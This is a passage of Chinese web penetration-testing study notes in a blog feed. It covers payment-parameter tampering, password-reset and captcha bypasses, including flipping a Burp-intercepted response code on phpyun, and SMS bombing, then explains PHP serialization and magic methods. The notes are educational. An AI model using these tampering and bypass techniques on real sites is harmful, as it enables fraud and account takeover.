+<h4 id="Burpsuite插件Authz"><a href="#Burpsuite插件Authz" class="headerlink" title="Burpsuite插件Authz"></a>Burpsuite插件Authz</h4><p><a href="https://www.cnblogs.com/MiWhite/p/7020520.html">https://www.cnblogs.com/MiWhite/p/7020520.html</a></p>
+<h4 id="中通安全开源项目之越权漏洞自动化检测"><a href="#中通安全开源项目之越权漏洞自动化检测" class="headerlink" title="中通安全开源项目之越权漏洞自动化检测"></a><a href="https://github.com/ztosec/secscan-authcheck">中通安全开源项目之越权漏洞自动化检测</a></h4><p><a href="https://www.cnblogs.com/starrys/p/13935730.html">https://www.cnblogs.com/starrys/p/13935730.html</a></p>
+<h2 id="登陆脆弱及支付篡改"><a href="#登陆脆弱及支付篡改" class="headerlink" title="登陆脆弱及支付篡改"></a>登陆脆弱及支付篡改</h2><h3 id="登陆应用功能点安全问题"><a href="#登陆应用功能点安全问题" class="headerlink" title="登陆应用功能点安全问题"></a>登陆应用功能点安全问题</h3><p>HTTP/HTTPS协议进行密码抓取时，<strong>一般</strong>HTTPS都是加过密的，HTTP直接是明文，也存在HTTP协议也加密了的情况</p>
+<p>若有加密数据需要知道采用的什么加密方式才能进行爆破</p>
+<h4 id="Cookie脆弱点验证"><a href="#Cookie脆弱点验证" class="headerlink" title="Cookie脆弱点验证"></a>Cookie脆弱点验证</h4><p>黑盒情况：登陆后看Cookie有无可操作的参数</p>
+<p>白盒情况：代码审计，看代码逻辑</p>
+<h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h4><p>选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单编号-&gt;订单支付选择-&gt;完成支付</p>
+<h4 id="常见篡改参数"><a href="#常见篡改参数" class="headerlink" title="常见篡改参数"></a>常见篡改参数</h4><p>商品编号ID，购买价格，购买数量，支付方式，订单编号，支付状态等</p>
+<h4 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h4><p>替换支付</p>
+<p>重复支付</p>
+<p>最小额支付</p>
+<p>负数支付</p>
+<p>溢出支付</p>
+<p>优惠券支付</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.secpulse.com/archives/67080.html">支付漏洞总结</a></p>
+<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p><a href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></p>
+<p><a href="https://github.com/huyuanzhi2/password_brute_dictionary">爆破字典</a></p>
+<p><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a>    提取码：xiao</p>
+<h2 id="找回机制及接口安全"><a href="#找回机制及接口安全" class="headerlink" title="找回机制及接口安全"></a>找回机制及接口安全</h2><h3 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h3><p>1.验证码在客户端回显（在浏览器或数据包中能看到服务端发送的验证码）</p>
+<p>phpyun平台绑定手机号码存在客户端数据包回显验证码</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%8C%85%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E7%A0%81.png" alt="客户端数据包回显验证码"></p>
+<p>2.Response状态值（类似false改成true，通过验证）</p>
+<p>phpyun平台绑定手机号码存在修改Response状态值，造成该漏洞的原因是前端代码的验证问题，<strong>主导权在本地</strong>，<strong>不是在服务端校验</strong>，相当于是将服务端的回显值在本地判断后进行验证</p>
+<p>我们先看正确的Response和错误的Response</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E6%AD%A3%E7%A1%AE%E7%9A%84Response.png" alt="正确的Response"></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%94%99%E8%AF%AF%E7%9A%84Response.png" alt="错误的Response"></p>
+<p>对比发现正确回显为1，错误回显为3</p>
+<p>我们只需要将回显值的包用burp抓到，并将错误回显改为正确回显即可</p>
+<p>用burp抓包，在Request请求包页面右键，选择<code>Do intercept</code>里面有一项<code>Response to this request</code></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/burp%E6%8A%93%E5%93%8D%E5%BA%94%E5%8C%85.png" alt="burp抓响应包"></p>
+<p>选择后便能抓到服务端的Response回复包</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%93%8D%E5%BA%94%E5%8C%85%E5%86%85%E5%AE%B9.png" alt="burp抓响应包"></p>
+<p>将3改为1，就能绑定成功</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E7%BB%91%E5%AE%9A%E6%88%90%E5%8A%9F.png" alt="绑定成功"></p>
+<p>3.验证码爆破</p>
+<p>4.找回流程中根据数据包的逻辑跳过验证（丢掉验证包）</p>
+<p>例如：</p>
+<p>流程为：</p>
+<ul>
+<li>发送验证码</li>
+<li>验证</li>
+<li>重置密码</li>
+</ul>
+<p>我们可以丢掉第二个数据包，或者把第二个数据包替换成第三个数据包，达到跳过验证目的</p>
+<h4 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h4><h5 id="墨者学院-登录密码重置漏洞分析溯源"><a href="#墨者学院-登录密码重置漏洞分析溯源" class="headerlink" title="墨者学院-登录密码重置漏洞分析溯源"></a><a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">墨者学院-登录密码重置漏洞分析溯源</a></h5><h6 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h6><p><a href="https://blog.csdn.net/weixin_39998158/article/details/100557216">https://blog.csdn.net/weixin_39998158/article/details/100557216</a></p>
+<h3 id="接口乱调用"><a href="#接口乱调用" class="headerlink" title="接口乱调用"></a>接口乱调用</h3><p>1.短信空炸</p>
+<p>2.来点轰炸</p>
+<h3 id="资源-1"><a href="#资源-1" class="headerlink" title="资源"></a>资源</h3><p><a href="https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg">weipan21/phpyun</a></p>
+<h2 id="验证码与token及接口"><a href="#验证码与token及接口" class="headerlink" title="验证码与token及接口"></a>验证码与token及接口</h2><p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81.png" alt="安全验证"></p>
+<h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>图片，手机或邮箱，语音，视频，操作等</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>验证生成或验证过程中的逻辑问题</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>账户权限泄露，短信轰炸，遍历，任意用户操作等</p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="验证码复用"><a href="#验证码复用" class="headerlink" title="验证码复用"></a>验证码复用</h5><p><a href="https://blog.csdn.net/qq_41901122/article/details/109451715">https://blog.csdn.net/qq_41901122/article/details/109451715</a></p>
+<p>一般是session没有清除导致的</p>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>前端：</p>
+<p>用浏览器查看是否有与验证码验证相关的代码，若有直接通过抓包发送绕过本地验证即可</p>
+<p>后端：一般复用绕过</p>
+<h5 id="客户端回显（前文已有）"><a href="#客户端回显（前文已有）" class="headerlink" title="客户端回显（前文已有）"></a>客户端回显（前文已有）</h5><h5 id="爆破（前文已有）"><a href="#爆破（前文已有）" class="headerlink" title="爆破（前文已有）"></a>爆破（前文已有）</h5><h3 id="token安全"><a href="#token安全" class="headerlink" title="token安全"></a>token安全</h3><p>token客户端回显</p>
+<p><a href="https://blog.csdn.net/qq_41542761/article/details/102893563">https://blog.csdn.net/qq_41542761/article/details/102893563</a></p>
+<h3 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="验证码识别插件工具使用"></a>验证码识别插件工具使用</h3><h4 id="captcha-killer-v0-1-2"><a href="#captcha-killer-v0-1-2" class="headerlink" title="captcha-killer v0.1.2"></a><a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">captcha-killer v0.1.2</a></h4><p><a href="https://www.cnblogs.com/nul1/p/12071115.html">使用burp插件captcha-killer识别图片验证码</a></p>
+<h4 id="reCAPTCHA-v1-0"><a href="#reCAPTCHA-v1-0" class="headerlink" title="reCAPTCHA v1.0"></a><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">reCAPTCHA v1.0</a></h4><h4 id="Pkav-Http-Fuzz"><a href="#Pkav-Http-Fuzz" class="headerlink" title="Pkav_Http_Fuzz"></a>Pkav_Http_Fuzz</h4><p><a href="https://sec.kim/2019/01/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%9Apkav-http-fuzzer/">https://sec.kim/2019/01/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%9Apkav-http-fuzzer/</a></p>
+<h3 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="接口安全问题"></a>接口安全问题</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>调用，遍历，未授权，篡改</p>
+<h4 id="调用案例"><a href="#调用案例" class="headerlink" title="调用案例"></a>调用案例</h4><p>短信轰炸</p>
+<h4 id="遍历案例"><a href="#遍历案例" class="headerlink" title="遍历案例"></a>遍历案例</h4><p>UID等便利</p>
+<h4 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h4><p>墨者学院靶场</p>
+<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="与越权的区别"><a href="#与越权的区别" class="headerlink" title="与越权的区别"></a>与越权的区别</h5><p>Jboss，Jenkins，ldap，Redis，elasticsearch，MenCache，Mongodb，Rsync，Zookeeper，Docker</p>
+<h3 id="资源（来源：http-www-xiaodi8-com）"><a href="#资源（来源：http-www-xiaodi8-com）" class="headerlink" title="资源（来源：http://www.xiaodi8.com）"></a>资源（来源：<a href="http://www.xiaodi8.com)/">http://www.xiaodi8.com）</a></h3><p><a href="https://pan.baidu.com/s/1LAhWTmZeSlXGVcGfonFtIQ">未授权访问漏洞集合</a></p>
+<p><a href="https://pan.baidu.com/s/1RxFwC_ar7GLY5b4gI9cmmg">web攻防之业务安全实战指南</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>逻辑越权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反序列化</title>
+    <url>/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%8C%96.png" alt="反序化"></p>
+<span id="more"></span>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化"></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对用户输入的序列化字符串进行检测，导致攻击者可以<strong>控制反序列化过程</strong>，从而导致RCE，SQL注入，目录遍历等不可控后果。在反序列化的过程中会自动触发某些魔术方法。当反序列化的时候就有可能触发对象中的一些魔术方法。</p>
+<blockquote>
+<p>序列化一个对象将会保存对象的所有变量，但是<strong>不会保存对象的方法</strong>，只会保存类的名字</p>
+<p>测试：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&quot;hello,world!&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var3</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var4</span> = <span class="number">0.1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var5</span> = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arg2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//$test-&gt;myfunc($test-&gt;var1, $test-&gt;var2);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span> = serialize(<span class="variable">$test</span>).PHP_EOL;<span class="comment">//PHP_EOL为php换行符，可以提高代码的源代码级可移植性</span></span><br><span class="line">var_dump(<span class="variable">$unser</span> = unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">5</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;var1&quot;</span>;b:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;var2&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;hello,world!&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;var3&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;var4&quot;</span>;d:<span class="number">0.1</span>;s:<span class="number">4</span>:<span class="string">&quot;var5&quot;</span>;N;&#125;</span><br><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (5) &#123;</span></span><br><span class="line"> [<span class="string">&quot;var1&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"> [<span class="string">&quot;var2&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line"> [<span class="string">&quot;var3&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line"> [<span class="string">&quot;var4&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">float</span>(<span class="number">0.1</span>)</span><br><span class="line"> [<span class="string">&quot;var5&quot;</span>]=&gt;</span><br><span class="line"> <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果中并没有记录myfunc()方法</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="PHP序列化字符串结构"><a href="#PHP序列化字符串结构" class="headerlink" title="PHP序列化字符串结构"></a>PHP序列化字符串结构</h3><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%93%E6%9E%84.png" alt="PHP序列化字符串结构"></p>
+<h3 id="public-protected-private下序列化对象的区别"><a href="#public-protected-private下序列化对象的区别" class="headerlink" title="public    protected    private下序列化对象的区别"></a>public    protected    private下序列化对象的区别</h3><p>测试：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$var2</span> = <span class="string">&quot;hello,world!&quot;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var3</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//$test-&gt;myfunc($test-&gt;var1, $test-&gt;var2);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span> = serialize(<span class="variable">$test</span>).PHP_EOL;<span class="comment">//PHP_EOL为php换行符，可以提高代码的源代码级可移植性</span></span><br><span class="line">var_dump(<span class="variable">$unser</span> = unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%ADpublic%E3%80%81protected%E3%80%81private%E4%B8%8B%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="public、protected、private下序列化对象的区别"></p>
+<ul>
+<li><p>public变量<br>直接变量名反序列化出来</p>
+</li>
+<li><p>protected变量<br><code>\00 + * + \00 + 变量名</code><br>可以用<code>S:5:&quot;\00*\00op&quot;</code>来代替<code>s:5:&quot;?*?op&quot;</code>    //此处的<code>?</code>是<code>\00字符</code>，因为不可显示所以用<code>?</code>代替</p>
+<p>疑惑：在在线平台测试的时候S和s没什么区别，本地测试必须用S</p>
+<p>测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$te</span> = <span class="string">&quot;O:5:\&quot;test1\&quot;:1:&#123;s:6:\&quot;\00*\00var\&quot;;s:12:\&quot;hello,world!\&quot;;&#125;&quot;</span>;<span class="comment">//S和s都可以</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$te</span>));</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#3 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;test1&quot;</span></span><br><span class="line">  [<span class="string">&quot;var&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>private变量<br><code>\x00 + 类名 + \x00 + 变量名</code></p>
+</li>
+</ul>
+<p>补充：</p>
+<p>\x：十六进制</p>
+<p>\d：十进制</p>
+<p>\o：八进制</p>
+<p>\x00不可见字符</p>
+<p>php v7.x反序列化的时候对访问类别不敏感</p>
+<h3 id="反序列化中S与s的区别"><a href="#反序列化中S与s的区别" class="headerlink" title="反序列化中S与s的区别"></a>反序列化中S与s的区别</h3><p>如果类型是<code>S</code>，会调用以下函数，简单来说就是将<code>\</code>解释成十六进制，来转成字符</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> zend_string *unserialize_str(<span class="keyword">const</span> unsigned char **p, size_t len, size_t maxlen)</span><br><span class="line">&#123;</span><br><span class="line">	size_t i, j;</span><br><span class="line">	zend_string *str = zend_string_safe_alloc(<span class="number">1</span>, len, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	unsigned char *end = *(unsigned char **)p+maxlen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end &lt; *p) &#123;</span><br><span class="line">		zend_string_efree(str);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (*p &gt;= end) &#123;</span><br><span class="line">			zend_string_efree(str);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (**p != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">			ZSTR_VAL(str)[i] = (char)**p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			unsigned char ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">				(*p)++;</span><br><span class="line">				<span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;a&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;A&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					zend_string_efree(str);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ZSTR_VAL(str)[i] = (char)ch;</span><br><span class="line">		&#125;</span><br><span class="line">		(*p)++;</span><br><span class="line">	&#125;</span><br><span class="line">	ZSTR_VAL(str)[i] = <span class="number">0</span>;</span><br><span class="line">	ZSTR_LEN(str) = i;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><blockquote>
+<p>以下内容来自于<a href="https://secure.php.net/manual/zh/language.oop5.magic.php">PHP官方文档中关于魔术方法的部分</a></p>
+</blockquote>
+<h4 id="构造方法和析构方法"><a href="#构造方法和析构方法" class="headerlink" title="构造方法和析构方法"></a>构造方法和析构方法</h4><ul>
+<li>__construct()<br>具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li>
+<li>__destruct()<br>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
+</ul>
+<p><code>new</code>出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()</p>
+<h4 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%AD__sleep(),__wakeup().png" alt="__sleep(),__wakeup()"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(<span class="keyword">$this</span>-&gt;server, <span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        mysql_select_db(<span class="keyword">$this</span>-&gt;db, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%AD__toString().png" alt="__toString()"></p>
+<p><code>echo</code>或者拼接字符串或者其他隐式调用该方法的操作都会触发</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Declare a simple class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$foo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="variable">$foo</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> TestClass(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//Hello</span></span><br><span class="line"><span class="comment">//注意：在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 